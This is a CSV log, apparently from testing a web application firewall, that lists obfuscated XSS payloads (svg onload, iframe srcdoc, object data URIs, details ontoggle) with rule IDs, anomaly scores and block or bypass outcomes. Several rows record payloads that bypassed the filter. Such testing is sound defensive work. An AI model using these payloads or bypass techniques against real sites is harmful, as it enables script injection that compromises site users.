74,<details open ontoggle=(function(){window['a'+'lert']`1`})()>,0,1,block,6,"934100,934100,934100,941100,941370,949110","o24,11v221,61 || o24,11v221,61t:urlDecodeUni || o22,11v221,61t:removeWhitespace || v221,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,18v221,61t:urlDecodeUni,t:compressWhitespace || ",25,176482709078.867043
75,<details open ontoggle=Function('al'+'\u0065rt(1)')()>,0,1,bypass,2,"920540,941100","v158,10o38,6v220,54 || v220,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,176482709326.928800
76,<details open ontoggle=Function('al'+'ert(1)')()>,0,1,bypass,1,941100,"v220,49t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,176482709681.407030
77,<details open ontoggle=Function(atob('YWxlcnQoMSk='))()>,0,1,bypass,2,"941100,941390","v220,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o32,5v220,56t:htmlEntityDecode,t:jsDecode",0,176482709935.833127
78,"<details open ontoggle=setTimeout(function(){eval(String.fromCharCode(97,108,101,114,116,40,49,41))},0)>",0,1,block,6,"933160,934100,934100,941100,941390,949110","o45,53v221,104 || o34,11v221,104 || o32,11v221,104t:removeWhitespace || v221,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o23,11v221,104t:htmlEntityDecode,t:jsDecode || ",25,176482710136.378505
79,"<iframe src=""data:text/html,<script>setTimeout(function(){Function('al'+String.fromCharCode(101)+'rt(1)')()},0)</script>"">",0,1,block,10,"934100,934100,934100,941100,941110,941130,941160,941170,941390,949110","o47,11v221,122 || o47,11v221,122t:urlDecodeUni || o46,11v221,122t:removeWhitespace || v221,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,8v221,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,15v221,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v221,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,16v221,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o36,11v221,122t:htmlEntityDecode,t:jsDecode || ",45,176482710496.075448
80,"<iframe srcdoc=""<script>(function(){Function('al'+String.fromCharCode(101)+'rt(1)')()})()</script>""></iframe>",0,1,block,8,"932130,934100,934100,934100,941100,941110,941160,949110","o22,62v221,109t:cmdLine || o25,11v221,109 || o25,11v221,109t:urlDecodeUni || o24,11v221,109t:removeWhitespace || v221,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v221,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v221,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,176482710792.119914
81,"<iframe srcdoc=""<script>(new Function('a'+'lert(1)'))()</script>"">",0,1,block,8,"932130,934100,934100,941100,941110,941160,941390,949110","o22,28v221,66t:cmdLine || o25,13v221,66 || o25,13v221,66t:urlDecodeUni || v221,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v221,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v221,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,13v221,66t:htmlEntityDecode,t:jsDecode || ",35,176482711036.733415
82,"<iframe srcdoc=""<script>new Function('a'+'lert(1)')()</script>"">",0,1,block,9,"934100,934100,941100,941110,941160,941390,942100,942100,949110","o24,13v221,64 || o24,13v221,64t:urlDecodeUni || v221,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v221,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v221,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,13v221,64t:htmlEntityDecode,t:jsDecode || v221,64 || v221,64t:urlDecodeUni || ",40,17648271125.100663
83,"<iframe srcdoc=""<script>new Function('return \\u0061lert(1)')();</script>""></iframe>",0,1,block,9,"920540,934100,934100,941100,941110,941160,941390,942100,949110","v158,10o46,6v221,84 || o24,13v221,84 || o24,13v221,84t:jsDecode || v221,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v221,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v221,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,13v221,84t:htmlEntityDecode,t:jsDecode || v221,84 || ",40,176482711578.130284
84,"<iframe srcdoc=""<script>self['ale'+'rt'](1)</script>""></iframe>",0,1,block,5,"941100,941110,941160,941370,949110","v221,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v221,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v221,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,16v221,63t:urlDecodeUni,t:compressWhitespace || ",20,176482711836.816854
85,"<iframe srcdoc=""<script>setTimeout(Function('al'+'ert(1)'),0)</script>"">",0,1,block,5,"941100,941110,941160,941390,949110","v221,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v221,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v221,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,11v221,72t:htmlEntityDecode,t:jsDecode || ",20,176482712139.363066
86,"<iframe srcdoc=""<script>setTimeout(function(){eval('ale'+'rt(1)')},0)</script>""></iframe>",0,1,block,9,"933160,934100,934100,934100,941100,941110,941160,941390,949110","o46,17v221,89 || o35,11v221,89 || o35,11v221,89t:urlDecodeUni || o34,11v221,89t:removeWhitespace || v221,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v221,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v221,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,11v221,89t:htmlEntityDecode,t:jsDecode || ",40,176482712360.517209
87,"<iframe srcdoc=""<script>var a=window; a['ale'+'rt'](1)</script>""></iframe>",0,1,block,4,"941100,941110,941160,949110","v221,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v221,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v221,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,176482712629.654990
88,"<iframe srcdoc=""<svg><script>(function(){let f='al'+'ert';window[f](9);})()</script></svg>""></iframe>",0,1,block,9,"932130,934100,934100,934100,941100,941110,941160,941370,949110","o27,43v221,101t:cmdLine || o30,11v221,101 || o30,11v221,101t:urlDecodeUni || o29,11v221,101t:removeWhitespace || v221,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o21,8v221,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v221,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o58,9v221,101t:urlDecodeUni,t:compressWhitespace || ",40,176482712999.418407
89,"<iframe srcdoc=""<svg><script>new Function('return ale'+'rt(1)')()</script></svg>"">",0,1,block,7,"934100,934100,941100,941110,941160,941390,949110","o29,13v221,82 || o29,13v221,82t:urlDecodeUni || v221,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o21,8v221,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v221,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,13v221,82t:htmlEntityDecode,t:jsDecode || ",30,176482713167.297983
90,"<object data=""data:text/html,<script>(new Function('\u0061\u006c\u0065\u0072\u0074(5)'))()</script>"">",0,1,block,12,"920540,932130,934100,934100,941100,941110,941130,941160,941170,941300,941390,949110","v158,10o52,6v221,101 || o35,47v221,101t:cmdLine || o38,13v221,101 || o38,13v221,101t:jsDecode || v221,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v221,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v221,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v221,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v221,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v221,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o38,13v221,101t:htmlEntityDecode,t:jsDecode || ",55,176482713499.648518
91,"<object data=""data:text/html,<script>(new Function(atob('YWxlcnQoMTIp')))()</script>"">",0,1,block,10,"932130,934100,941100,941110,941130,941160,941170,941300,941390,949110","o35,37v221,86t:cmdLine || o38,13v221,86 || v221,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v221,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v221,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v221,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v221,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v221,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o38,13v221,86t:htmlEntityDecode,t:jsDecode || ",45,176482713761.797042
92,"<object data=""data:text/html,<script>Function('ale'+String.fromCharCode(114,116)+'(1)')()</script>""></object>",0,1,block,10,"934100,934100,934100,941100,941110,941130,941160,941170,941300,949110","o52,19v221,109 || o52,19v221,109t:urlDecodeUni || o50,19v221,109t:removeWhitespace || v221,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v221,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v221,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v221,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v221,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v221,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",45,176482714070.798499
93,"<object data=""data:text/html,<script>new Function('\u0061\u006c\u0065\u0072\u0074(1)')()</script>""></object>",0,1,block,11,"920540,934100,934100,941100,941110,941130,941160,941170,941300,941390,949110","v158,10o51,6v221,108 || o37,13v221,108 || o37,13v221,108t:jsDecode || v221,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v221,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v221,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v221,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v221,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v221,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o37,13v221,108t:htmlEntityDecode,t:jsDecode || ",50,176482714399.941698
94,"<object data=""data:text/html,<svg onload=Function('al'+'ert(1)')()></svg>""></object>",0,1,block,6,"941100,941130,941160,941170,941300,949110","v221,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v221,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v221,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v221,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v221,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,176482714517.940392
95,"<object data='data:text/html,<script>Function(""al""+""ert(1)"")()</script>'></object>",0,1,block,7,"941100,941110,941130,941160,941170,941300,949110","v221,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v221,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v221,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v221,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v221,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v221,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,176482714811.139143
96,"<object data='data:text/html,<svg xmlns=""http://www.w3.org/2000/svg""><script>eval(atob(""YWxlcnQoMSk=""))</script></svg>'></object>",0,1,block,11,"933160,934100,934100,941100,941110,941130,941160,941170,941300,941390,949110","o77,25v221,129 || o77,5v221,129 || o75,5v221,129t:removeWhitespace || v221,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o69,8v221,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v221,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v221,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v221,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v221,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o77,5v221,129t:htmlEntityDecode,t:jsDecode || ",50,176482715160.870065
97,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='eval(&quot;al&quot;+&quot;ert(1)&quot;)'></svg>""></object>",0,1,block,11,"933160,934100,934100,934100,941100,941130,941160,941170,941300,941390,949110","o94,32v221,152 || o94,5v221,152 || o94,5v221,152t:urlDecodeUni || o90,5v221,152t:removeWhitespace || v221,152t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v221,152t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v221,152t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v221,152t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v221,152t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o94,5v221,152t:htmlEntityDecode,t:jsDecode || ",50,176482715395.922223
98,"<svg onload=""((function(){var a=String.fromCharCode;eval(a(97,108,101,114,116,40,49,41));})())""></svg>",0,1,block,7,"933160,934100,934100,941100,941160,941390,949110","o52,35v221,102 || o15,11v221,102 || o14,11v221,102t:removeWhitespace || v221,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o52,5v221,102t:htmlEntityDecode,t:jsDecode || ",30,176482715688.898168
99,"<svg onload=""((function(){var a=atob;eval(a('YWxlcnQoMSk='));})())""></svg>",0,1,block,7,"933160,934100,934100,941100,941160,941390,949110","o37,22v221,74 || o15,11v221,74 || o14,11v221,74t:removeWhitespace || v221,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o37,5v221,74t:htmlEntityDecode,t:jsDecode || ",30,176482715969.539311
100,"<svg onload=""((new Function('al'+String.fromCharCode(101)+'r'+'t(1)'))())""></svg>",0,1,block,7,"934100,934100,934100,941100,941160,941390,949110","o15,13v221,81 || o15,13v221,81t:urlDecodeUni || o30,19v221,81t:removeWhitespace || v221,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o15,13v221,81t:htmlEntityDecode,t:jsDecode || ",30,17648271626.564064
101,"<svg onload=""((new Function('return al' + 'ert'))())(1)"">",0,1,block,6,"934100,934100,941100,941160,941390,949110","o15,13v221,57 || o15,13v221,57t:urlDecodeUni || v221,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o15,13v221,57t:htmlEntityDecode,t:jsDecode || ",25,176482716479.132299
102,"<svg onload=""(function x(){return Function('ale'+'rt(1)')}())()""></svg>",0,1,bypass,2,"941100,941160","v221,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,176482716787.183466
103,"<svg onload=""(function(){const f=window['\u0061lert'];f(String.fromCharCode(88,83,83))})()""></svg>",0,1,block,8,"920540,934100,934100,934100,941100,941160,941370,949110","v158,10o41,6v221,98 || o14,11v221,98 || o14,11v221,98t:jsDecode || o13,11v221,98t:removeWhitespace || v221,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o33,20v221,98t:urlDecodeUni,t:compressWhitespace || ",35,17648271703.045009
104,"<svg onload=""(function(){new Function('return ' + atob('YWxlcnQoMSk='))()})()"">",0,1,block,7,"934100,934100,934100,941100,941160,941390,949110","o14,11v221,79 || o14,11v221,79t:urlDecodeUni || o13,11v221,79t:removeWhitespace || v221,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,13v221,79t:htmlEntityDecode,t:jsDecode || ",30,176482717346.607478
105,"<svg onload=""(function(){return Function('ale'+'rt(1)')}())()""></svg>",0,1,block,6,"934100,934100,934100,941100,941160,949110","o14,11v221,69 || o14,11v221,69t:urlDecodeUni || o13,11v221,69t:removeWhitespace || v221,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17648271767.944105
106,"<svg onload=""(function(){var a=String.fromCharCode(97,108,101,114,116);window[a](1);})();""></svg>",0,1,block,6,"934100,934100,941100,941160,941370,949110","o14,11v221,97 || o13,11v221,97t:removeWhitespace || v221,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o71,9v221,97t:urlDecodeUni,t:compressWhitespace || ",25,176482717848.301194
107,"<svg onload=""(function(){var a=String.fromCharCode;var b=a(97)+a(108)+a(101)+a(114)+a(116);window[b](1);})();""></svg>",0,1,block,7,"934100,934100,934100,941100,941160,941370,949110","o14,11v221,117 || o14,11v221,117t:urlDecodeUni || o13,11v221,117t:removeWhitespace || v221,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o91,9v221,117t:urlDecodeUni,t:compressWhitespace || ",30,176482718150.583753
108,"<svg onload=""(function(){var a=window['al'+'ert'];a(1);})();""></svg>",0,1,block,7,"934100,934100,934100,941100,941160,941370,949110","o14,11v221,68 || o14,11v221,68t:urlDecodeUni || o13,11v221,68t:removeWhitespace || v221,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o31,18v221,68t:urlDecodeUni,t:compressWhitespace || ",30,17648271846.286576
109,"<svg onload=""(function(){var g='a'+'l'+'ert';window[g](9);})()"">",0,1,block,7,"934100,934100,934100,941100,941160,941370,949110","o14,11v221,64 || o14,11v221,64t:urlDecodeUni || o13,11v221,64t:removeWhitespace || v221,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o45,9v221,64t:urlDecodeUni,t:compressWhitespace || ",30,176482718720.343230
110,"<svg onload=""(function(){var l='a'+'l'+'ert';window[l](16);})()"">",0,1,block,7,"934100,934100,934100,941100,941160,941370,949110","o14,11v221,65 || o14,11v221,65t:urlDecodeUni || o13,11v221,65t:removeWhitespace || v221,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o45,9v221,65t:urlDecodeUni,t:compressWhitespace || ",30,176482718999.714314
111,"<svg onload=""(function(){var x='a'+'lert';window[x](1);})()"">",0,1,block,7,"934100,934100,934100,941100,941160,941370,949110","o14,11v221,61 || o14,11v221,61t:urlDecodeUni || o13,11v221,61t:removeWhitespace || v221,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o42,9v221,61t:urlDecodeUni,t:compressWhitespace || ",30,176482719264.514601
112,"<svg onload=""(function(){var x=atob('YWxlcnQ=');window[x](1);})()"">",0,1,block,7,"934100,934100,941100,941160,941370,941390,949110","o14,11v221,67 || o13,11v221,67t:removeWhitespace || v221,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o48,9v221,67t:urlDecodeUni,t:compressWhitespace || o31,5v221,67t:htmlEntityDecode,t:jsDecode || ",30,176482719510.932816
113,"<svg onload=""(function(){window.atob=Function;atob(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))()}())""></svg>",0,1,block,6,"934100,934100,941100,941160,941390,949110","o14,11v221,126 || o13,11v221,126t:removeWhitespace || v221,126t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,126t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o46,5v221,126t:htmlEntityDecode,t:jsDecode || ",25,176482719749.220229
114,"<svg onload=""(new Function('al'+String.fromCharCode(101,114,116)+'(1)'))()"">",0,1,block,7,"934100,934100,934100,941100,941160,941390,949110","o14,13v221,76 || o14,13v221,76t:urlDecodeUni || o29,19v221,76t:removeWhitespace || v221,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,13v221,76t:htmlEntityDecode,t:jsDecode || ",30,176482720048.065599
115,"<svg onload=""(new Function('return \\u0061\\u006c\\u0065\\u0072\\u0074(1)'))()"">",0,1,block,7,"920540,934100,934100,941100,941160,941390,949110","v158,10o36,6v221,80 || o14,13v221,80 || o14,13v221,80t:jsDecode || v221,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,13v221,80t:htmlEntityDecode,t:jsDecode || ",30,176482720313.143205
116,"<svg onload=""(new Function('return wind'+'ow\u002eal'+'ert'))()('XSS')"">",0,1,block,8,"920540,934100,934100,934100,941100,941160,941390,949110","v158,10o44,6v221,72 || o14,13v221,72 || o14,13v221,72t:urlDecodeUni || o14,13v221,72t:jsDecode || v221,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,13v221,72t:htmlEntityDecode,t:jsDecode || ",35,17648272062.004246
117,"<svg onload=""(new Function(atob('YWxlcnQoJ1hTUycp'))())""></svg>",0,1,block,5,"934100,941100,941160,941390,949110","o14,13v221,63 || v221,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,13v221,63t:htmlEntityDecode,t:jsDecode || ",20,176482720890.643745
118,"<svg onload=""Function('ale'+'rt(16)')()"">",0,1,block,5,"941100,941160,942100,942100,949110","v220,41t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v220,41t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v220,41 || v220,41t:urlDecodeUni || ",20,176482721194.296511
